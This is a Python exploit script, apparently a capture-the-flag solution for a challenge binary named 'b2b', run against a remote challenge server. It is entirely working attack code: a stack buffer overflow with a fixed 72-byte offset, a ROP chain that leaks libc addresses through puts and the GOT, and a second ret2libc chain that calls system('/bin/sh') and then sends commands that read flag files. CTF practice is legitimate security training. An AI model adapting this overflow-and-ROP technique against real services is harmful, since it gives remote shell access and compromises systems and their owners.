#!/usr/bin/env python3

from __future__ import annotations

import argparse
import socket
import struct
import subprocess
import time
from typing import BinaryIO


BINARY = "/root/squ1rrel2026CTF/b2b/starting_files/b2b"
HOST = "challs.squ1rrel.dev"
PORT = 5000

OFFSET = 72
POP_RDI = 0x40117E
RET = 0x40101A
PUTS_PLT = 0x401060
BACK2BASICS = 0x4011E8

PUTS_GOT = 0x404000
READ_GOT = 0x404008
SETVBUF_GOT = 0x404028

PROMPT = b"name your favorite classic:\n"
PUTS_OFFSET = 0x87BE0
SYSTEM_OFFSET = 0x58750
BINSH_OFFSET = 0x1CB42F


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def recv_until(stream: BinaryIO, marker: bytes) -> bytes:
    data = b""
    while marker not in data:
        chunk = stream.read(1)
        if not chunk:
            break
        data += chunk
    return data


def build_leak_payload() -> bytes:
    payload = b"A" * OFFSET
    for got in (PUTS_GOT, READ_GOT, SETVBUF_GOT):
        payload += p64(POP_RDI) + p64(got) + p64(PUTS_PLT)
    payload += p64(BACK2BASICS)
    return payload


def build_shell_payload(libc_base: int) -> bytes:
    system_addr = libc_base + SYSTEM_OFFSET
    binsh_addr = libc_base + BINSH_OFFSET
    payload = b"A" * OFFSET
    payload += p64(RET)
    payload += p64(POP_RDI)
    payload += p64(binsh_addr)
    payload += p64(system_addr)
    return payload


def parse_leaks(output: bytes) -> tuple[int, int]:
    prefix = b"class dismissed.\n"
    if prefix not in output:
        raise ValueError("Leak output missing expected prefix")
    leak_block = output.split(prefix, 1)[1]
    lines = leak_block.split(b"\n")
    puts_leak = int.from_bytes(lines[0].ljust(8, b"\x00"), "little")
    read_leak = int.from_bytes(lines[1].ljust(8, b"\x00"), "little")
    return puts_leak, read_leak


def run_local() -> bytes:
    proc = subprocess.Popen(
        [BINARY],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    assert proc.stdin is not None
    assert proc.stdout is not None
    banner = recv_until(proc.stdout, PROMPT)
    print(banner.decode("latin1", "replace"), end="")
    proc.stdin.write(build_leak_payload())
    proc.stdin.flush()
    proc.stdin.close()
    output = proc.stdout.read()
    return output


def run_remote() -> bytes:
    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        file = sock.makefile("rwb", buffering=0)
        banner = recv_until(file, PROMPT)
        print(banner.decode("latin1", "replace"), end="")
        file.write(build_leak_payload())
        file.flush()
        sock.settimeout(2)
        chunks: list[bytes] = []
        while True:
            try:
                chunk = sock.recv(4096)
            except TimeoutError:
                break
            if not chunk:
                break
            chunks.append(chunk)
            if PROMPT in b"".join(chunks):
                break
        return b"".join(chunks)


def exploit_remote() -> None:
    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        file = sock.makefile("rwb", buffering=0)
        banner = recv_until(file, PROMPT)
        print(banner.decode("latin1", "replace"), end="")
        file.write(build_leak_payload())
        file.flush()

        sock.settimeout(2)
        chunks: list[bytes] = []
        while True:
            try:
                chunk = sock.recv(4096)
            except TimeoutError:
                break
            if not chunk:
                break
            chunks.append(chunk)
            if PROMPT in b"".join(chunks):
                break

        leak_output = b"".join(chunks)
        print("LEAK_RAW:", leak_output)
        puts_leak, read_leak = parse_leaks(leak_output)
        libc_base = puts_leak - PUTS_OFFSET
        print(f"puts@libc = {hex(puts_leak)}")
        print(f"read@libc = {hex(read_leak)}")
        print(f"libc base = {hex(libc_base)}")
        print(f"read delta = {hex(read_leak - libc_base)}")

        file.write(build_shell_payload(libc_base))
        file.flush()
        time.sleep(0.2)
        file.write(b"echo MARKER; cat flag.txt; cat /flag; cat /home/ctf/flag; cat /app/flag; exit\n")
        file.flush()

        sock.settimeout(2)
        result: list[bytes] = []
        while True:
            try:
                chunk = sock.recv(4096)
            except TimeoutError:
                break
            if not chunk:
                break
            result.append(chunk)

        final_output = b"".join(result)
        print(final_output.decode("latin1", "replace"))


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("mode", choices=["local", "remote", "exploit"])
    args = parser.parse_args()

    if args.mode == "local":
        output = run_local()
        print("RAW:", output)
        print("HEX:", output.hex())
        return 0

    if args.mode == "remote":
        output = run_remote()
        print("RAW:", output)
        print("HEX:", output.hex())
        return 0

    exploit_remote()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())